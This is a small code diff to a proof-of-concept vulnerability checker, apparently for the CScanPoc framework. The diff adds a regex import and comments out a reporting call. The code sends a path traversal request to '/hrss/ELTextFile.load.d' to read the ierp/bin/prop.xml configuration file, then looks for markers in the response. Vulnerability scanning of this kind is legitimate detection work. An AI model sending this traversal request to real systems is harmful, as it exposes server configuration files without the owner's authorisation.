@@ -1,5 +1,5 @@
 # coding: utf-8
-
+import re
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
@@ -37,7 +37,7 @@ class Poc(ABPoc):
             code, head, res, errcode, _ = hh.http(url + '/hrss/ELTextFile.load.d?src=../../ierp/bin/prop.xml')
             #print res
             if code == 200:
-                security_hole(url + '/hrss/ELTextFile.load.d?src=../../ierp/bin/prop.xml')
+                # security_hole(url + '/hrss/ELTextFile.load.d?src=../../ierp/bin/prop.xml')
                 m = re.search("enableHotDeploy", res) 
                 k = re.search("internalServiceArray", res)
                 if m and k:
